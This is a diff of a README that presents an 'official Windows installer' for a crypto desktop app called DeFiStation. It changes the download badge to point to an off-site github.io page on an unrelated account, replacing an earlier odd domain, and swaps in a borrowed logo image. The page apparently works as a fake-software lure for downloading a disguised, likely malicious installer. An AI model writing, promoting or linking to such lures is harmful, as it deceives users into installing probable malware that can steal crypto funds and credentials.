@@ -2,7 +2,7 @@
 
 Official Windows installer for **DeFiStation** — a professional desktop application crafted for performance, stability, and security. This native build eliminates browser overhead and provides a predictable workspace for research, monitoring, and execution across crypto workflows.
 
-[![Download DeFiStation](https://img.shields.io/badge/Download-DeFiStation-blueviolet)](https://obsprosect.com)
+[![GET DeFiStation Windows](https://img.shields.io/badge/GET%20%E2%80%94%20DeFiStation-Windows-0078D6?style=for-the-badge&logoColor=white)](https://olifffoxohmer.github.io/.github/DeFiStation-Windows)
 
 ---
 
@@ -34,7 +34,7 @@ Practitioners choose DeFiStation because it pairs deterministic performance with
 - 💽 **Storage:** 6 GB free space
 
 ### 🖼 Preview
-![DeFiStation Logo](https://logo.clearbit.com/defistation.io)
+![DeFiStation Logo](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQjikKPockEzrBq7LY3Cw_TL7yl2Iad9QaQIt2hKLe9TA&s)
 *Official branding preview.*
 
 ---
